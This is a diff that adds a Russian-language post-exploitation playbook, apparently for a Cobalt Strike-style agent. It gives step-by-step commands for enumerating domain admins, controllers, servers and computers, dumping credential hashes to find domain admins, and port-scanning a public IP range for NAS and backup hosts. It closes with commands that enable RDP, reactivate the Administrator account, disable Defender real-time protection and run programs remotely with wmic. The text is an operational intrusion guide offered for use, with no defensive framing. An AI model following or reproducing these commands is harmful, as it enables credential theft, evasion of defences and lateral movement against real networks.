@@ -1,0 +1,40 @@
+ПЕРЕХОДИМ В АГЕНТА:
+ПРАВОЙ КНОПКОЙ МЫШИ ПО АГЕНТУ И ЖМЕМ  INTERACT
+
+1)ПОСМОТРЕТЬ СПИСОК АДМИНИСТРАТОРОВ   shell net group "domain admins" /domain
+
+2)ИМЯ ДОМЕНА                          shell net view /all /domain
+
+3)ПОСМОТРЕТЬ СПИСОК DC                shell nltest /dclist:"NameDomain"
+
+4)УЗНАТЬ СПИСОК СЕРВЕРОВ
+ПОДГРУЖАЕМ МОДУЛЬ PowerView
+ПРАВОЙ КОНОПКОЙ МЫШИ ПО АГЕНТУ  Get Info > Get Servers
+ПОЛУЧИЛИ СПИСОК СЕРВЕРОВ
+
+5)УЗНАТЬ СПИСОК КОМПЬЮТЕРОВ
+ТАК КАК МОДУЛЬ PowerView УЖЕ ПОДГРУЖЕН
+ПРАВОЙ КОНОПКОЙ МЫШИ ПО АГЕНТУ  Get Info > Get All Computers
+ПОЛУЧИЛИ СПИСОК КОМПЬТЕРОВ
+
+6)НАДО УЗНАТЬ ПАРОЛИ ВСЕХ АДМИНОВ ДОМЕНА
+ПРАВОЙ КНОПКОЙ МЫШИ ПО АГЕНТУ 
+ЖМЕМ ACCESS > DUMP HASHES
+ПЕРЕХОДИМ ВЫШЕ ВКЛАДКА VIEW > CREDENTIALS
+ЗАБИРАЕМ ВСЕ ХЕШИ И ИЩЕМ АДМИНОВ ДОМЕНА
+
+7)НАДО НАЙТИ NAS , BACKUP
+ЭТОЙ КОМАНДОЙ МЫ УЗНАЕМ ВСЕ ПОДСЕТИ ДАННОГО ДОМЕНА  powershell Get-NetSubnet
+СЛЕДУЩЕЙ КОМАНДОЙ НУЖНО УЗНАТЬ НА КАКОМ IP АДРЕССЕ НАХОДИТСЯ NAS , BACKUP
+portscan 107.191.177.1-107.191.177.255 5000 icmp 1024 
+
+СПИСОК ПОЛЕЗНЫХ КОММАНД КОТОРЫЕ МОГУ ПРИГОДИТЬСЯ:
+
+СНЯТЬ ПРАВА АГЕНТА ДО ДЕФОЛТА             rev2self
+ВКЛЮЧИТЬ ЮЗЕРА ЧЕРЕЗ ЦМД                  shell net user Администратор /active:yes
+ИНФОРМАЦИЯ О ПОЛЬЗОВАТЕЛЕ                 shell net user careadmin /domain
+ВКЛЮЧИТЬ RDP СОЕДИНЕНИЕ                   shell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+ОТКЛЮЧЕНИЕ ДЕФЕНДЕРА                      powershell Set-MpPreference -DisableRealtimeMonitoring $true
+ОБНОВЛЕНИЕ ПОЛИТИК                        shell repadmin /syncall /AdeP
+ПОКАЗАТЬ ТРАСТЫ ДОМЕНОВ                   shell nltest /domain_trusts /all_trusts
+ЗАПУСК ПРОГРАММЫ НА ДРУГОМ ПК             shell wmic /node:"ИМЯ ПК" process call create "КОМАНДА КОТОРУЮ НАДО ВЫПОЛНИТЬ"
